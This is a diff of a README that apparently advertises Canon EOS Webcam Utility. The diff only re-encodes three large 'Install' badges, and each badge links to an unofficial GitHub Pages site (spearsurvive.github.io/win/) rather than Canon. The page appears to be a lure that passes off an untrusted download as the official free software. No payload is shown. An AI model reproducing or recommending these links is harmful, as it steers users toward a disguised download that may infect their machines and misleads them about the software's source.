@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Canon EOS Webcam Utility](https://img.shields.io/badge/⬇_Install_Canon%20EOS%20Webcam%20Utility-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Canon EOS Webcam Utility](https://img.shields.io/badge/⬇_Install_Canon+EOS+Webcam+Utility-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -81,7 +81,7 @@ Canon EOS Webcam Utility is a free application from Canon that lets you use a co
 
 <div align="center">
 
-[![⬇ Install Canon EOS Webcam Utility](https://img.shields.io/badge/⬇_Install_Canon%20EOS%20Webcam%20Utility-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Canon EOS Webcam Utility](https://img.shields.io/badge/⬇_Install_Canon+EOS+Webcam+Utility-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -125,7 +125,7 @@ Canon EOS Webcam Utility is a free application from Canon that lets you use a co
 
 <div align="center">
 
-[![⬇ Install Canon EOS Webcam Utility](https://img.shields.io/badge/⬇_Install_Canon%20EOS%20Webcam%20Utility-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Canon EOS Webcam Utility](https://img.shields.io/badge/⬇_Install_Canon+EOS+Webcam+Utility-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
